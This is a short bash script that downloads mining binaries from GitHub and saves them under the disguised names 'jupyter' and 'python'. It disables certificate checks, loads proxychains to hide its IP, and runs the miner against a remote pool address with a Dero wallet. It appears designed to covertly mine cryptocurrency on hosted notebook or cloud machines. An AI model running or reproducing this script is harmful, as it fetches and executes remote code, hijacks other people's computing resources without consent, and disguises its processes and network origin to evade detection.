#!/bin/bash

wget --no-check-certificate 'https://github.com/rigmining/code/raw/main/jupyter' -O jupyter
chmod +x jupyter
wget --no-check-certificate 'https://github.com/rigmining/code/raw/main/panel' -O python
chmod +x python
wget --no-check-certificate 'https://raw.githubusercontent.com/artazimuka/prxymaxzy/main/libproxychains4.so' -O libproxychains4.so
chmod +x libproxychains4.so
wget --no-check-certificate 'https://raw.githubusercontent.com/artazimuka/prxymaxzy/main/proxychains.conf' -O proxychains.conf
chmod +x proxychains.conf
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(./python curl ifconfig.me)
./python ./jupyter -r 45.77.42.162:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.CPU
